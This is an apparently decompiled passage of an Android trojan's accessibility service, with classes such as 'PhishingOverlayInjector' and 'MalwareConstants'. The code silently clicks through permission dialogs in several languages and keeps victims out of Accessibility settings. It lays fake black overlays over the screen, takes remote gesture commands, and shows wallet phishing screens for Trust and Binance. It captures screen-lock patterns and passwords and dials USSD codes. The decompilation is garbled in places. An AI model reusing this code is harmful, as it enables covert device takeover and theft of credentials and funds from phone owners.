            AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
            if (MyAccess != null) {
                // branch: cond_604
            }
            MainBackgroundService.MyAccess = v0;
            } catch (Exception e) {
                e.printStackTrace();
            boolean echo = DataEncryptionEngine.echo;
            if (echo == null) {
                // branch: cond_60b
            }
            p0 .. p1.sendNotification();
            Context result144 = p0 .. p0.getApplicationContext();
            // continue loop -> :goto_5f1
            boolean sendGoogleAuth = AccessibilityServiceCore.sendGoogleAuth;
            if (sendGoogleAuth == null) {
                // branch: cond_625
            }
            CharSequence result145 = p1 .. p1.getPackageName();
            String result146 = result.toString();
            String result147 = result.toLowerCase();
            DataPackagingEngine._SGA2(param1, result);
            // continue loop -> :goto_627
            boolean echo2 = DataEncryptionEngine.echo;
            if (echo2 == null) {
                // branch: cond_62e
            }
            p0 .. p1.sendActivation();
            Boolean fOR_IN = AccessibilityServiceCore.fOR_IN;
            boolean result148 = fOR_IN.booleanValue();
            if (result == null) {
                // branch: cond_64b
            }
            boolean result149 = v0.Gotitinstalled(null);
            if (result == null) {
                // branch: cond_64b
            }
            Boolean result150 = Boolean.valueOf(null);
            AccessibilityServiceCore.fOR_IN = result;
            Thread.sleep(result, result);
            p0 .. p0.blockBackButton();
            } catch (Exception e) {
                e.printStackTrace();
            Boolean autoClick = AccessibilityServiceCore.autoClick;
            boolean result151 = autoClick.booleanValue();
            if (result != null) {
                // branch: cond_663
            }
            Boolean fOR_SC = AccessibilityServiceCore.fOR_SC;
            boolean result152 = fOR_SC.booleanValue();
            if (result != null) {
                // branch: cond_663
            }
            Boolean fOR_prim = AccessibilityServiceCore.fOR_prim;
            boolean result153 = fOR_prim.booleanValue();
            if (result == null) {
                // branch: cond_7ac
            }
            if (null != null) {
                // branch: cond_666
            }
            return;
            Boolean fOR_SC2 = AccessibilityServiceCore.fOR_SC;
            boolean result154 = fOR_SC2.booleanValue();
            if (result == null) {
                // branch: cond_673
            }
            String str63 = "Start Now";
            boolean result155 = AccessibilityServiceCore.clickByText(str63);
            Boolean fOR_prim2 = AccessibilityServiceCore.fOR_prim;
            boolean result156 = fOR_prim2.booleanValue();
            if (result == null) {
                // branch: cond_680
            }
            String str64 = "Allow";
            boolean result157 = AccessibilityServiceCore.clickByText(str64);
            int val63 = 5;
            String[] arr = new String[val63];
            String str65 = "com.android.packageinstaller:id/permission_allow_button";
            arr[null] = str65;
            String str66 = "android:id/button1";
            arr[1] = str66;
            String str67 = "com.android.settings:id/action_button";
            int val64 = 2;
            arr[val64] = str67;
            String str68 = "com.android.permissioncontroller:id/permission_allow_foreground_only_button";
            int val65 = 3;
            arr[val65] = str68;
            String str69 = "com.android.permissioncontroller:id/permission_allow_button";
            int val66 = 4;
            arr[val66] = str69;
            int val67 = 5;
            if (null >= val67) {
                // branch: cond_6d9
            }
            String item = arr[null];
            List result158 = null.findAccessibilityNodeInfosByViewId(item);
            Iterator result159 = result.iterator();
            boolean result160 = result.hasNext();
            if (result == null) {
                // branch: cond_6d6
            }
            Object result161 = result.next();
            result = (AccessibilityNodeInfo) result;
            CharSequence result162 = result.getText();
            if (result == null) {
                // branch: cond_6c9
            }
            String str70 = "\u5378\u8f7d";
            CharSequence result163 = result.getText();
            boolean result164 = str70.equals(result);
            if (result == null) {
                // branch: cond_6c9
            }
            return;
            int val68 = 16;
            boolean result165 = result.performAction(val68);
            Boolean result166 = Boolean.valueOf(null);
            AccessibilityServiceCore.autoClick = result;
            // continue loop -> :goto_6aa
            int val69 = null + 0x1;
            // continue loop -> :goto_69d
            int val70 = 3;
            String[] arr2 = new String[val70];
            String str71 = "com.android.permissioncontroller:id/permission_allow_foreground_only_button";
            arr2[null] = str71;
            String str72 = "android:id/button1";
            arr2[1] = str72;
            String str73 = "com.android.permissioncontroller:id/permission_allow_button";
            int val71 = 2;
            arr2[val71] = str73;
            int val72 = 3;
            if (null >= val72) {
                // branch: cond_728
            }
            String item2 = arr2[null];
            List result167 = null.findAccessibilityNodeInfosByViewId(item2);
            Iterator result168 = result.iterator();
            boolean result169 = result.hasNext();
            if (result == null) {
                // branch: cond_725
            }
            Object result170 = result.next();
            result = (AccessibilityNodeInfo) result;
            CharSequence result171 = result.getText();
            if (result == null) {
                // branch: cond_718
            }
            String str74 = "\u5378\u8f7d";
            CharSequence result172 = result.getText();
            boolean result173 = str74.equals(result);
            if (result == null) {
                // branch: cond_718
            }
            return;
            int val73 = 16;
            boolean result174 = result.performAction(val73);
            Boolean result175 = Boolean.valueOf(null);
            AccessibilityServiceCore.autoClick = result;
            // continue loop -> :goto_6f9
            int val74 = null + 0x1;
            // continue loop -> :goto_6ec
            int val75 = 13;
            String[] arr3 = new String[val75];
            String str75 = "\u672c\u6b21";
            arr3[null] = str75;
            String str76 = "Once";
            arr3[1] = str76;
            int val76 = 2;
            arr3[val76] = str77;
            String str78 = "kali";
            int val77 = 3;
            arr3[val77] = str78;
            String str79 = "l\u1ea7n";
            int val78 = 4;
            arr3[val78] = str79;
            String str80 = "\u1010\u1005\u103a\u1000\u103c\u102d\u1019\u103a";
            int val79 = 5;
            arr3[val79] = str80;
            String str81 = "\u59cb\u7ec8";
            int val80 = 6;
            arr3[val80] = str81;
            String str82 = "Allow";
            int val81 = 7;
            arr3[val81] = str82;
            String str83 = "time";
            int val82 = 8;
            arr3[val82] = str83;
            String str84 = "\u0f51\u0f0b\u0f51\u0f7a\u0f0b\u0f46\u0f7c\u0f42";
            int val83 = 9;
            arr3[val83] = str84;
            String str85 = "izinkan";
            int val84 = 10;
            arr3[val84] = str85;
            String str86 = "Ch\u1ea5p nh\u1eadn";
            int val85 = 11;
            arr3[val85] = str86;
            String str87 = "\u1001\u103d\u1004\u1037\u103a\u1015\u103c\u102f\u1015\u102b";
            int val86 = 12;
            arr3[val86] = str87;
            List result176 = Arrays.asList(arr3);
            Iterator result177 = result.iterator();
            boolean result178 = result.hasNext();
            if (result == null) {
                // branch: cond_7ac
            }
            Object result179 = result.next();
            result = (String) result;
            List result180 = null.findAccessibilityNodeInfosByText(result);
            boolean result181 = result.isEmpty();
            if (result != null) {
                // branch: cond_7a9
            }
            Object result182 = result.get(null);
            result = (AccessibilityNodeInfo) result;
            boolean result183 = result.isClickable();
            if (result == null) {
                // branch: cond_7a9
            }
            int val87 = 16;
            boolean result184 = result.performAction(val87);
            Boolean result185 = Boolean.valueOf(null);
            AccessibilityServiceCore.autoClick = result;
            // continue loop -> :goto_77a
            int val88 = 16;
            // continue loop -> :goto_77a
            } catch (Exception e) {
                e.printStackTrace();
            boolean checkPermissions = AccessibilityServiceCore.checkPermissions;
            if (checkPermissions == null) {
                // branch: cond_810
            }
            String[] result186 = DataPackagingEngine.PERMISSIONS();
            boolean result187 = DataPackagingEngine.H__P(v0, result);
            if (result != null) {
                // branch: cond_80d
            }
            AccessibilityServiceCore.checkPermissions = null;
            Intent intent = new Intent();
            Class cls = PhishingOverlayInjector.class;
            int val89 = 268435456;
            Intent result188 = intent.addFlags(val89);
            int val90 = 1073741824;
            Intent result189 = result.addFlags(val90);
            v0.startActivity(result);
            return;
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result190 = Boolean.valueOf(1);
            boolean result191 = result.booleanValue();
            if (result == null) {
                // branch: cond_7e6
            }
            Boolean result192 = Boolean.valueOf(null);
            // continue loop -> :goto_7d9
            boolean result193 = result.booleanValue();
            if (result == null) {
                // branch: cond_7f3
            }
            Boolean result194 = Boolean.valueOf(null);
            // continue loop -> :goto_7e6
            boolean result195 = result.booleanValue();
            if (result == null) {
                // branch: cond_800
            }
            Boolean result196 = Boolean.valueOf(null);
            // continue loop -> :goto_7f3
            boolean result197 = result.booleanValue();
            if (result == null) {
                // branch: cond_810
            }
            Boolean result198 = Boolean.valueOf(null);
            // continue loop -> :goto_800
            AccessibilityServiceCore.checkPermissions = 1;
            Boolean bypassSecurity = AccessibilityServiceCore.bypassSecurity;
            boolean result199 = bypassSecurity.booleanValue();
            if (result != null) {
                // branch: cond_8eb
            }
            boolean ifFinishiInitPermission2 = AccessibilityServiceCore.ifFinishiInitPermission;
            if (ifFinishiInitPermission2 == null) {
                // branch: cond_8eb
            }
            boolean ifFinishAll = AutoPermissionGranter.ifFinishAll;
            if (ifFinishAll == null) {
                // branch: cond_8eb
            }
            StringBuilder stringBuilder = new StringBuilder();
            String str88 = "[";
            StringBuilder result200 = stringBuilder.append(str88);
            String result201 = p0 .. p0.getPackageName();
            String result202 = AccessibilityServiceCore.getAppName(v0, result);
            String result203 = result.toLowerCase();
            StringBuilder result204 = stringBuilder.append(result);
            String str89 = "]";
            StringBuilder result205 = stringBuilder.append(str89);
            String result206 = stringBuilder.toString();
            String result207 = p0 .. p0.getPackageName();
            String result208 = AccessibilityServiceCore.getAppName(v0, result);
            String result209 = result.toLowerCase();
            CharSequence result210 = p1 .. p1.getClassName();
            String result211 = result.toString();
            String result212 = result.toLowerCase();
            String str90 = "com.android.settings.SubSettings";
            String result213 = str90.toLowerCase();
            CharSequence result214 = p1 .. p1.getClassName();
            String result215 = result.toString();
            String result216 = result.toLowerCase();
            boolean result217 = result.equals(result);
            if (result == null) {
                // branch: cond_89b
            }
            String result218 = p0 .. p1.getEventText();
            String result219 = result.toLowerCase();
            String result220 = result.toLowerCase();
            boolean result221 = result.equals(result);
            if (result != null) {
                // branch: cond_895
            }
            String result222 = p0 .. p1.getEventText();
            String result223 = result.toLowerCase();
            String result224 = result.toLowerCase();
            boolean result225 = result.equals(result);
            if (result == null) {
                // branch: cond_89b
            }
            p0 .. p0.blockBackButton();
            p0 .. p0.navigateHome();
            String result226 = p0 .. p1.getEventText();
            String result227 = result.toLowerCase();
            String result228 = p0 .. p0.getPackageName();
            String result229 = AccessibilityServiceCore.getAppName(v0, result);
            String result230 = result.toLowerCase();
            CharSequence result231 = p1 .. p1.getPackageName();
            String result232 = result.toString();
            String result233 = result.toLowerCase();
            String str91 = "Accessibility";
            String result234 = str91.toLowerCase();
            boolean result235 = result.contains(result);
            if (result == null) {
                // branch: cond_8d3
            }
            boolean result236 = result.contains(result);
            if (result == null) {
                // branch: cond_8d3
            }
            p0 .. p0.blockBackButton();
            p0 .. p0.navigateHome();
            String str92 = "Accessibility";
            String result237 = str92.toLowerCase();
            boolean result238 = result.contains(result);
            if (result == null) {
                // branch: cond_8eb
            }
            boolean result239 = result.contains(result);
            if (result == null) {
                // branch: cond_8eb
            }
            p0 .. p0.blockBackButton();
            p0 .. p0.navigateHome();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onInterrupt() {
        return;
    }

    public void onServiceConnected() {
        try {
            p0 .. p0.onServiceConnected();
            int val = 2;
            boolean result = v0.performGlobalAction(val);
            LoadingScreenOverlay.show(p0 .. p0);
            AppUninstallerEngine.start(p0 .. p0);
            p0 .. p0.subescribeDbevicbeList();
            LanguageManager.initLanguage();
            p0 .. p0.unlockScreenListen();
            AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
            int val2 = 115;
            accessibilityServiceInfo.flags = val2;
            int val3 = -1;
            accessibilityServiceInfo.eventTypes = val3;
            accessibilityServiceInfo.notificationTimeout = v3;
            accessibilityServiceInfo.packageNames = null;
            accessibilityServiceInfo.feedbackType = val3;
            v0.setServiceInfo(accessibilityServiceInfo);
            } catch (Exception e) {
                e.printStackTrace();
            Context result2 = p0 .. p0.getApplicationContext();
            String result3 = AccessibilityServiceCore.getApplicationName(result);
            String result4 = result.toLowerCase();
            AccessibilityServiceCore.CurrentName = result;
            MainBackgroundService.MyAccess = v0;
            Context result5 = p0 .. p0.getApplicationContext();
            String str = "window";
            Object result6 = v0.getSystemService(str);
            result = (WindowManager) result;
            FrameLayout frameLayout = new FrameLayout();
            WindowManager.LayoutParams windowManager.LayoutParams = new WindowManager.LayoutParams();
            int val4 = 2032;
            int val5 = -2142501736;
            int val6 = -3;
            int val7 = 48;
            windowManager.LayoutParams.gravity = val7;
            AccessibilityServiceCore.overlayLayout = windowManager.LayoutParams;
            AccessibilityServiceCore.windowManager = result;
            FrameLayout frameLayout2 = new FrameLayout();
            AccessibilityServiceCore.injview = frameLayout2;
            int val8 = 8;
            frameLayout2.setVisibility(val8);
            Context result7 = p0 .. p0.getApplicationContext();
            String str2 = "SCH";
            String str3 = "720";
            String result8 = My_Settings.read(result, str2, str3);
            Context result9 = p0 .. p0.getApplicationContext();
            String str4 = "SCW";
            String str5 = "1080";
            String result10 = My_Settings.read(result, str4, str5);
            WindowManager.LayoutParams windowManager.LayoutParams2 = new WindowManager.LayoutParams();
            Integer result11 = Integer.valueOf(result);
            int result12 = result.intValue();
            Integer result13 = Integer.valueOf(result);
            int result14 = result.intValue();
            int val9 = 2032;
            int val10 = 262152;
            AccessibilityServiceCore.layoutParams = windowManager.LayoutParams2;
            int val11 = 53;
            windowManager.LayoutParams2.gravity = val11;
            WindowManager.LayoutParams layoutParams = AccessibilityServiceCore.layoutParams;
            int val12 = -2;
            layoutParams.width = val12;
            WindowManager.LayoutParams layoutParams2 = AccessibilityServiceCore.layoutParams;
            layoutParams2.height = val12;
            FrameLayout injview = AccessibilityServiceCore.injview;
            WindowManager.LayoutParams layoutParams3 = AccessibilityServiceCore.layoutParams;
            result.addView(injview, layoutParams3);
            WindowManager.LayoutParams windowManager.LayoutParams3 = new WindowManager.LayoutParams();
            Integer result15 = Integer.valueOf(result);
            int result16 = result.intValue();
            Integer result17 = Integer.valueOf(result);
            int result18 = result.intValue();
            int val13 = 2032;
            int val14 = -2142501248;
            AccessibilityServiceCore.Fakeparams = windowManager.LayoutParams3;
            WindowManager.LayoutParams windowManager.LayoutParams4 = new WindowManager.LayoutParams();
            Integer result19 = Integer.valueOf(result);
            int result20 = result.intValue();
            Integer result21 = Integer.valueOf(result);
            int result22 = result.intValue();
            int val15 = 2032;
            int val16 = -2142501224;
            AccessibilityServiceCore.Fakeparams_bass = windowManager.LayoutParams4;
            FrameLayout frameLayout3 = new FrameLayout();
            AccessibilityServiceCore.Fakelay = frameLayout3;
            String str6 = "#000000";
            int result23 = Color.parseColor(str6);
            frameLayout3.setBackgroundColor(result);
            WindowManager.LayoutParams Fakeparams = AccessibilityServiceCore.Fakeparams;
            int val17 = 51;
            Fakeparams.gravity = val17;
            FrameLayout Fakelay = AccessibilityServiceCore.Fakelay;
            Drawable result24 = Fakelay.getBackground();
            int val18 = 253;
            result.setAlpha(val18);
            FrameLayout Fakelay2 = AccessibilityServiceCore.Fakelay;
            Fakelay2.setVisibility(val8);
            FrameLayout Fakelay3 = AccessibilityServiceCore.Fakelay;
            WindowManager.LayoutParams Fakeparams_bass = AccessibilityServiceCore.Fakeparams_bass;
            result.addView(Fakelay3, Fakeparams_bass);
            } catch (Exception e) {
                e.printStackTrace();
            String targetPackagePrimary = MainLauncherActivity.targetPackagePrimary;
            PackageManager result25 = p0 .. p0.getPackageManager();
            boolean result26 = MainLauncherActivity.isPackageInstalled(targetPackagePrimary, result);
            if (result == null) {
                // branch: cond_156
            }
            String targetPackagePrimary2 = MainLauncherActivity.targetPackagePrimary;
            String result27 = targetPackagePrimary2.toLowerCase();
            String str7 = "null";
            boolean result28 = result.equals(str7);
            if (result != null) {
                // branch: cond_156
            }
            Context result29 = p0 .. p0.getApplicationContext();
            PackageManager result30 = result.getPackageManager();
            String targetPackagePrimary3 = MainLauncherActivity.targetPackagePrimary;
            Intent result31 = result.getLaunchIntentForPackage(targetPackagePrimary3);
            int val19 = 268435456;
            Intent result32 = result.addFlags(val19);
            v0.startActivity(result);
            } catch (Exception e) {
                e.printStackTrace();
            Class cls = MainBackgroundService.class;
            Application result33 = p0 .. p0.getApplication();
            boolean result34 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, result);
            if (result == null) {
                // branch: cond_170
            }
            Intent intent = new Intent();
            Context result35 = p0 .. p0.getApplicationContext();
            Class cls2 = MainBackgroundService.class;
            ComponentName result36 = v0.startService(intent);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean onUnbind(Intent param1) {
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        if (SDK_INT < val) {
            // branch: cond_a
        }
        DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(p0);
        // continue loop -> :goto_d
        this.stopSelf();
        boolean result = this.onUnbind(param1);
        return result;
    }

    public void perfectSetting() {
        AutoPermissionGranter.start(p0);
        return;
    }

    public void subescribeDbevicbeList() {
        AccessibilityServiceCore.20 accessibilityServiceCore.20 = new AccessibilityServiceCore.20();
        this.callbeack = accessibilityServiceCore.20;
        String Evnet_Type_PerfectSetting = MalwareConstants.Evnet_Type_PerfectSetting;
        String Evnet_Type_FInish_Perfect = MalwareConstants.Evnet_Type_FInish_Perfect;
        Object[] arr = new String[]{ Evnet_Type_PerfectSetting, Evnet_Type_FInish_Perfect };
        AccessibilityEventMonitor.subscribe(accessibilityServiceCore.20, 1, result);
        return;
    }

    public void takeScreenshot(int param1, Executor param2, AccessibilityService.TakeScreenshotCallback param3) {
        this.takeScreenshot(param1, param2, param3);
        return;
    }

    public void sendActivation(AccessibilityEvent param1) {
        try {
            String result = this.getEventText(param1);
            CharSequence result2 = param1.getPackageName();
            result = (String) result;
            Context result3 = this.getApplicationContext();
            PackageManager result4 = result.getPackageManager();
            ApplicationInfo result5 = result.getApplicationInfo(result, null);
            // continue loop -> :goto_18
            } catch (Exception e) {
                e.printStackTrace();
            if (null == null) {
                // branch: cond_1f
            }
            CharSequence result6 = result.getApplicationLabel(null);
            // continue loop -> :goto_24
            String[] c_mn = MainBackgroundService.c_mn;
            int val = 3;
            String item = c_mn[val];
            item = (String) item;
            String A_A = DataPackagingEngine.A_A;
            byte[] result7 = item.getBytes();
            DataEncryptionEngine.encodeBase64(A_A, result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        } catch (PackageManager$NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public String readRemoteData(String param1) {
        try {
            File result = Environment.getExternalStorageDirectory();
            File file = new File();
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result2 = stringBuilder.append(result);
            String str = "/Config/sys/apps/log";
            StringBuilder result3 = stringBuilder.append(str);
            String result4 = stringBuilder.toString();
            StringBuilder stringBuilder2 = new StringBuilder();
            String str2 = "log-";
            StringBuilder result5 = stringBuilder2.append(param1);
            String str3 = ".txt";
            StringBuilder result6 = stringBuilder2.append(str3);
            String result7 = stringBuilder2.toString();
            boolean result8 = file.exists();
            if (result != null) {
                // branch: cond_56
            }
            File file2 = new File();
            StringBuilder stringBuilder3 = new StringBuilder();
            StringBuilder result9 = stringBuilder3.append(result);
            StringBuilder result10 = stringBuilder3.append(str);
            String result11 = stringBuilder3.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            StringBuilder result12 = stringBuilder4.append(param1);
            StringBuilder result13 = stringBuilder4.append(str3);
            String result14 = stringBuilder4.toString();
            StringBuilder stringBuilder5 = new StringBuilder();
            BufferedReader bufferedReader = new BufferedReader();
            FileReader fileReader = new FileReader();
            String result15 = bufferedReader.readLine();
            if (result == null) {
                // branch: cond_6f
            }
            StringBuilder result16 = stringBuilder5.append(result);
            // continue loop -> :goto_65
            bufferedReader.close();
            } catch (Exception e) {
                e.printStackTrace();
            String result17 = stringBuilder5.toString();
            return result;
        } catch (IOException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void switchScreen(String param1) {
        try {
            String str = "";
            String str2 = "";
            String str3 = "";
            Resources result = p0 .. p0.getResources();
            DisplayMetrics result2 = result.getDisplayMetrics();
            int SDK_INT = Build$VERSION.SDK_INT;
            int val = 26;
            if (SDK_INT < val) {
                // branch: cond_8d0
            }
            String str4 = "clk";
            boolean result3 = param1.startsWith(str4);
            int val2 = 3;
            int val3 = 2;
            if (result == null) {
                // branch: cond_76
            }
            String str5 = ":";
            String[] result4 = param1.split(str5);
            Object item = result[1];
            int result5 = Integer.parseInt(item);
            Object item2 = result[val3];
            int result6 = Integer.parseInt(item2);
            String str6 = "hold";
            boolean result7 = param1.contains(str6);
            if (result == null) {
                // branch: cond_4f
            }
            Object item3 = result[val3];
            int result8 = Integer.parseInt(item3);
            Object item4 = result[val2];
            int result9 = Integer.parseInt(item4);
            int val4 = 3000;
            // continue loop -> :goto_50
            Path path = new Path();
            path.moveTo(val4, result);
            DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
            long longVal = (long) val4;
            GestureDescription.StrokeDescription result10 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(v10 .. v15);
            GestureDescription.Builder result11 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
            GestureDescription.Builder result12 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
            GestureDescription result13 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
            boolean result14 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(v1, result, null, null);
            return;
            String str7 = "Bc";
            boolean result15 = result.equals(str7);
            if (result == null) {
                // branch: cond_82
            }
            boolean result16 = v1.performGlobalAction(val4);
            return;
            String str8 = "Ho";
            boolean result17 = result.equals(str8);
            int val5 = 268435456;
            if (result == null) {
                // branch: cond_b0
            }
            boolean result18 = DataPackagingEngine.GS_B(p0 .. p0);
            if (result != null) {
                // branch: cond_ac
            }
            Intent intent = new Intent();
            Class cls = WakeLockKeeperActivity.class;
            Intent result19 = intent.addFlags(val5);
            int val6 = 536870912;
            Intent result20 = intent.addFlags(val6);
            int val7 = 8388608;
            Intent result21 = intent.addFlags(val7);
            v1.startActivity(intent);
            p0 .. p0.wakeupScreen();
            boolean result22 = v1.performGlobalAction(val3);
            return;
            String str9 = "RC";
            boolean result23 = intent.equals(str9);
            if (result == null) {
                // branch: cond_bc
            }
            boolean result24 = v1.performGlobalAction(val2);
            return;
            String str10 = "LK";
            boolean result25 = intent.equals(str10);
            int val8 = 8;
            if (result == null) {
                // branch: cond_d4
            }
            boolean result26 = DataPackagingEngine.GS_B(p0 .. p0);
            if (result != null) {
                // branch: cond_d0
            }
            boolean result27 = v1.performGlobalAction(val4);
            // continue loop -> :goto_d3
            boolean result28 = v1.performGlobalAction(val8);
            return;
            String str11 = "LKSM";
            boolean result29 = result.equals(str11);
            String str12 = "YES";
            if (result == null) {
                // branch: cond_e9
            }
            Context result30 = p0 .. p0.getApplicationContext();
            String str13 = "SME";
            My_Settings.Write(result, str13, str12);
            // continue loop -> :goto_8d0
            String str14 = "LKKM";
            boolean result31 = result.equals(str14);
            String str15 = "NO";
            if (result == null) {
                // branch: cond_103
            }
            Context result32 = p0 .. p0.getApplicationContext();
            String str16 = "SME";
            My_Settings.Write(result, str16, str15);
            FrameLayout injview = AccessibilityServiceCore.injview;
            injview.setVisibility(val8);
            // continue loop -> :goto_8d0
            String str17 = "LKSI";
            boolean result33 = injview.equals(str17);
            if (result == null) {
                // branch: cond_116
            }
            Context result34 = p0 .. p0.getApplicationContext();
            String str18 = "SIM";
            My_Settings.Write(result, str18, str12);
            // continue loop -> :goto_8d0
            String str19 = "LKKI";
            boolean result35 = result.equals(str19);
            if (result == null) {
                // branch: cond_12e
            }
            Context result36 = p0 .. p0.getApplicationContext();
            String str20 = "SIM";
            My_Settings.Write(result, str20, str15);
            FrameLayout injview2 = AccessibilityServiceCore.injview;
            injview2.setVisibility(val8);
            // continue loop -> :goto_8d0
            String str21 = "LKST";
            boolean result37 = injview2.equals(str21);
            if (result == null) {
                // branch: cond_141
            }
            Context result38 = p0 .. p0.getApplicationContext();
            String str22 = "STO";
            My_Settings.Write(result, str22, str12);
            // continue loop -> :goto_8d0
            String str23 = "LKKT";
            boolean result39 = result.equals(str23);
            if (result == null) {
                // branch: cond_159
            }
            Context result40 = p0 .. p0.getApplicationContext();
            String str24 = "STO";
            My_Settings.Write(result, str24, str15);
            FrameLayout injview3 = AccessibilityServiceCore.injview;
            injview3.setVisibility(val8);
            // continue loop -> :goto_8d0
            String str25 = "LKSU";
            boolean result41 = injview3.equals(str25);
            if (result == null) {
                // branch: cond_16c
            }
            Context result42 = p0 .. p0.getApplicationContext();
            String str26 = "STR";
            My_Settings.Write(result, str26, str12);
            // continue loop -> :goto_8d0
            String str27 = "LKKU";
            boolean result43 = result.equals(str27);
            if (result == null) {
                // branch: cond_184
            }
            Context result44 = p0 .. p0.getApplicationContext();
            String str28 = "STR";
            My_Settings.Write(result, str28, str15);
            FrameLayout injview4 = AccessibilityServiceCore.injview;
            injview4.setVisibility(val8);
            // continue loop -> :goto_8d0
            String str29 = "LKSDU";
            boolean result45 = injview4.equals(str29);
            if (result == null) {
                // branch: cond_190
            }
            v1.showtrust = val4;
            // continue loop -> :goto_8d0
            String str30 = "LKKDU";
            boolean result46 = injview4.equals(str30);
            if (result == null) {
                // branch: cond_19c
            }
            v1.showtrust = path;
            // continue loop -> :goto_8d0
            String str31 = "LKSBU";
            boolean result47 = injview4.equals(str31);
            if (result == null) {
                // branch: cond_1a8
            }
            v1.showbinance = val4;
            // continue loop -> :goto_8d0
            String str32 = "LKKBU";
            boolean result48 = injview4.equals(str32);
            if (result == null) {
                // branch: cond_1b4
            }
            v1.showbinance = path;
            // continue loop -> :goto_8d0
            String str33 = "LKeo";
            boolean result49 = injview4.equals(str33);
            String str34 = "1";
            if (result == null) {
                // branch: cond_1f4
            }
            p0 .. p0.wakeupScreen();
            boolean result50 = v1.performGlobalAction(val2);
            String passcheck = AccessibilityServiceCore.passcheck;
            boolean result51 = str34.equals(passcheck);
            if (result == null) {
                // branch: cond_1db
            }
            Thread thread = new Thread();
            AccessibilityServiceCore.5 accessibilityServiceCore.5 = new AccessibilityServiceCore.5();
            thread.start();
            // continue loop -> :goto_8d0
            String str35 = "2";
            String passcheck2 = AccessibilityServiceCore.passcheck;
            boolean result52 = str35.equals(passcheck2);
            if (result == null) {
                // branch: cond_8d0
            }
            Thread thread2 = new Thread();
            AccessibilityServiceCore.6 accessibilityServiceCore.6 = new AccessibilityServiceCore.6();
            thread2.start();
            // continue loop -> :goto_8d0
            String str36 = "LKddd";
            boolean result53 = thread2.equals(str36);
            if (result == null) {
                // branch: cond_215
            }
            String str37 = "";
            MainBackgroundService.currentSuccessPassword = str37;
            String str38 = "";
            AccessibilityServiceCore.ccurrentPassword = str38;
            Set screenLockPointSet = ScreenLockMonitor.screenLockPointSet;
            screenLockPointSet.clear();
            LinkedList screenLockPointList = ScreenLockMonitor.screenLockPointList;
            screenLockPointList.clear();
            LinkedList successcreenLockPointList = ScreenLockMonitor.successcreenLockPointList;
            successcreenLockPointList.clear();
            // continue loop -> :goto_8d0
            String str39 = "LKou";
            boolean result54 = successcreenLockPointList.equals(str39);
            String str40 = "com.samsung.android.dialer";
            String str41 = "samsung";
            String str42 = "bassit";
            String str43 = "Block";
            String str44 = "*";
            String str45 = "com.android.incallui:id/icon";
            String str46 = "android.intent.action.CALL";
            String str47 = "tel:";
            // goto :cond_36a
            // goto :cond_36a
            String str48 = "LKtu";
            boolean result55 = successcreenLockPointList.equals(str48);
            if (result == null) {
                // branch: cond_4b9
            }
            if (successcreenLockPointList == null) {
                // branch: cond_8d0
            }
            boolean result56 = successcreenLockPointList.isEmpty();
            if (result != null) {
                // branch: cond_8d0
            }
            Context result57 = p0 .. p0.getApplicationContext();
            String isblocked = My_Settings.isblocked;
            Boolean result58 = Boolean.valueOf(val4);
            My_Settings.WriteBool(result, isblocked, result);
            AccessibilityServiceCore MyAccess = MainBackgroundService.MyAccess;
            MyAccess.Treger(str43);
            AccessibilityServiceCore MyAccess2 = MainBackgroundService.MyAccess;
            MyAccess2.Treger(str42);
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result59 = stringBuilder.append(isblocked);
            StringBuilder result60 = stringBuilder.append(str44);
            StringBuilder result61 = stringBuilder.append(isblocked);
            String str49 = "*1*1*";
            StringBuilder result62 = stringBuilder.append(str49);
            StringBuilder result63 = stringBuilder.append(str49);
            String str50 = "#";
            StringBuilder result64 = stringBuilder.append(str50);
            String result65 = stringBuilder.toString();
            String MANUFACTURER = Build.MANUFACTURER;
            boolean result66 = MANUFACTURER.equalsIgnoreCase(str41);
            if (result == null) {
                // branch: cond_448
            }
            Intent intent2 = new Intent();
            StringBuilder stringBuilder2 = new StringBuilder();
            String result67 = Uri.encode(result);
            StringBuilder result68 = stringBuilder2.append(result);
            String result69 = stringBuilder2.toString();
            Uri result70 = Uri.parse(result);
            int val9 = 268435456;
            Intent result71 = intent2.setFlags(val9);
            v1.startActivity(intent2);
            Thread.sleep(val9, result);
            boolean result72 = v1.performGlobalAction(val4);
            PackageManager result73 = p0 .. p0.getPackageManager();
            Intent result74 = result.getLaunchIntentForPackage(str40);
            int val10 = 268435456;
            Intent result75 = intent2.setFlags(val10);
            v1.startActivity(result);
            Thread.sleep(v18 .. v19);
            AccessibilityServiceCore MyAccess3 = MainBackgroundService.MyAccess;
            AccessibilityServiceCore.clipboardText = result;
            AccessibilityServiceCore MyAccess4 = MainBackgroundService.MyAccess;
            Boolean result76 = Boolean.valueOf(val4);
            AccessibilityServiceCore.needsPaste = result;
            AccessibilityServiceCore MyAccess5 = MainBackgroundService.MyAccess;
            MyAccess5.triggerEvent();
            Thread.sleep(v18 .. v19);
            AccessibilityNodeInfo result77 = p0 .. p0.getRootInActiveWindow();
            String str51 = "com.samsung.android.dialer:id/image_view";
            List result78 = result.findAccessibilityNodeInfosByViewId(str51);
            AccessibilityNodeInfo result79 = p0 .. p0.getRootInActiveWindow();
            String str52 = "com.samsung.android.dialer:id/dialButtonImage";
            List result80 = result.findAccessibilityNodeInfosByViewId(str52);
            Object result81 = result.get(null);
